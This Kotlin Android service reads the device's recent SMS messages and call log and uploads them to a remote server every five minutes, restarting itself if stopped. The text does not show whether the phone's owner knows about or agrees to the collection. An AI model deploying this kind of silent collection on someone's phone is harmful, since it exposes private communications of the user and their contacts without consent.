package com.clukey.os.service

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.*
import android.provider.CallLog
import android.provider.Telephony
import androidx.core.app.ActivityCompat
import com.clukey.os.network.CloudSyncService
import com.clukey.os.utils.AppLogger
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

/**
 * SmsCallLogService — reads SMS history and call log from device,
 * pushes them to server so dashboard can display them.
 * Runs once on start then every 5 minutes for new entries.
 */
class SmsCallLogService : Service() {

    private val TAG = "SmsCallLogService"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.launch {
            syncSms()
            syncCallLog()
            // Repeat every 5 min
            while (isActive) {
                delay(300_000L)
                syncSms()
                syncCallLog()
            }
        }
        return START_STICKY
    }

    private fun syncSms() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return
        try {
            val messages = mutableListOf<Map<String, String>>()
            val cursor: Cursor? = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms.DATE} DESC LIMIT 100"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    messages.add(mapOf(
                        "from" to (it.getString(0) ?: ""),
                        "body" to (it.getString(1) ?: "").take(500),
                        "date" to fmt.format(Date(it.getLong(2)))
                    ))
                }
            }
            scope.launch { CloudSyncService.pushSmsHistory(messages) }
            AppLogger.i(TAG, "SMS synced: ${messages.size} messages")
        } catch (e: Exception) {
            AppLogger.e(TAG, "SMS sync failed", e)
        }
    }

    private fun syncCallLog() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) return
        try {
            val calls = mutableListOf<Map<String, String>>()
            val typeMap = mapOf(
                CallLog.Calls.INCOMING_TYPE to "incoming",
                CallLog.Calls.OUTGOING_TYPE to "outgoing",
                CallLog.Calls.MISSED_TYPE   to "missed"
            )
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    calls.add(mapOf(
                        "number"   to (it.getString(0) ?: ""),
                        "type"     to (typeMap[it.getInt(1)] ?: "unknown"),
                        "duration" to "${it.getLong(2)}s",
                        "date"     to fmt.format(Date(it.getLong(3)))
                    ))
                }
            }
            scope.launch { CloudSyncService.pushCallLog(calls) }
            AppLogger.i(TAG, "Call log synced: ${calls.size} calls")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Call log sync failed", e)
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
